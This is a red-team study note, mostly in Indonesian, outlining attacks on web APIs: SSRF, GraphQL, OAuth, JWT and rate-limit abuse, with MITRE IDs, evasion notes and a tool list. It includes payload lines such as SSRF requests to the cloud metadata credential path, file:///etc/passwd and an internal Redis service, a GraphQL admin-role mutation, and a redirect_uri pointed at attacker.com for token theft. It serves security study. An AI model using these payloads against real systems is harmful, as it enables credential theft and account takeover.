---
title: Attack Perspective — Web API & SSRF (Red Team)
tags: [attack,red-team,api,ssrf,graphql,rest,imds,oauth]
source: web-api-ssrf.md
status: complete
---
cssclasses:
  - wide-table
  - callout

# Web API & SSRF — Perspektif Penyerang

> API = data gateway modern. SSRF = jembatan ke internal. Red team: API enum (Swagger/OpenAPI), GraphQL introspection, SSRF → IMDS, OAuth flow abuse, rate limit bypass.

## 1. Attack Surface API

| Komponen | Vektor | MITRE ID | Tool / Teknik | Evasion | Detection Gap |
|----------|--------|----------|---------------|---------|----------------|
| **REST API** | IDOR, mass assignment, auth bypass | T1190 | Burp, Postman, manual | Param fuzz = legit request | API audit = rare |
| **GraphQL** | Introspection, batch query, mutation abuse | T1190 | graphql-introspection, Altair | Introspection = public by default | GraphQL audit = rare |
| **Swagger/OpenAPI** | Doc leak → endpoint discovery | T1590 | swagger-ui scan, /v2/api-docs | Doc = public (misconfig) | Doc audit = rare |
| **SSRF** | Internal scan, IMDS creds | T1190 | Burp, custom | Filter bypass (redirect, DNS rebind) | Egress filter = partial |
| **OAuth** | Redirect URI abuse, token theft | T1557 | Burp, manual | Redirect = legit flow | OAuth audit = rare |
| **JWT** | alg:none, key confusion, weak secret | T1143 | jwt_tool, hashcat | JWT = valid format | JWT audit = rare |
| **Rate Limit** | No rate limit → brute, credential stuffing | T1110 | Burp Intruder, custom | Distributed = below threshold | Rate audit = per-IP only |
| **Webhook** | Webhook injection → SSRF via webhook | T1190 | Custom webhook → internal URL | Webhook = legit feature | Webhook audit = rare |

## 2. SSRF Kill Chain

```
Recon: Find parameter yang fetch URL
  ├── url=, link=, next=, redirect=, webhook=, callback=
  ├── Import feature (URL import, RSS fetch)
  └→ Webhook config (send to URL)
    ↓
Test: url=http://127.0.0.1:80 → response? 
  ├── Ya → SSRF confirmed
  ├── Filter → bypass (redirect, DNS rebind, IPv6, decimal)
  └→ Blind SSRF → timing (sleep) / DNS callback (interactsh)
    ↓
Exploit:
  ├── Internal scan: http://10.0.0.0/8 → port scan internal
  ├── IMDS: http://169.254.169.254/latest/meta-data/iam/security-credentials/
  ├── Internal service: http://localhost:6379 (Redis) → RCE
  ├── Cloud metadata: GCP, Azure MSI
  └→ File read: file:///etc/passwd (if scheme allowed)
    ↓
Result: Internal access → cloud creds → lateral
```

## 3. GraphQL Attack

```
Discovery: /graphql, /v1/graphql, /api/graphql
    ↓
Introspection:
  POST {"query":"{__schema{types{name fields{name}}}}"}
  → full schema dump → all query/mutation
    ↓
Attack:
  ├── IDOR: query user(id:1) → user(id:2) → data access
  ├── Batch: query{ a:user(id:1) b:user(id:2) } → rate bypass
  ├── Mutation abuse: mutation{ updateRole(id:1, role:"admin") }
  ├── Introspection disable bypass: fragment overlap, aliasing
  └→ Error-based: trigger error → schema leak
    ↓
Evasion: GraphQL = single endpoint → WAF rule = generic (bypass via query shape)
```

## 4. OAuth Flow Abuse

```
Recon: Login flow → OAuth provider (Google/GitHub/Azure)
  ├── redirect_uri, client_id, scope
  └→ Callback endpoint
    ↓
Attack:
  ├── Redirect URI: change redirect_uri → attacker.com → token ke attacker
  ├── Token theft: CSRF → attacker login → bind victim account
  ├── Scope abuse: request extra scope (email, admin)
  └→ Authorization code replay
    ↓
Result: Account takeover / API access
```

## 5. Tool Stack

| Tool | Use |
|------|-----|
| **Burp Suite** | API intercept, SSRF testing, OAuth flow |
| **ffuf** | API endpoint discovery |
| **Altair / GraphQL Playground** | GraphQL exploration |
| **jwt_tool** | JWT attack |
| **interactsh** | Blind SSRF callback |
| **nuclei** | API vuln template |

## 6. Referensi
- OWASP API Top 10 — https://owasp.org/www-project-api-security/
- PortSwigger SSRF — https://portswigger.net/web-security/ssrf
- GraphQL Security — https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application
- JWT Attack — https://portswigger.net/web-security/jwt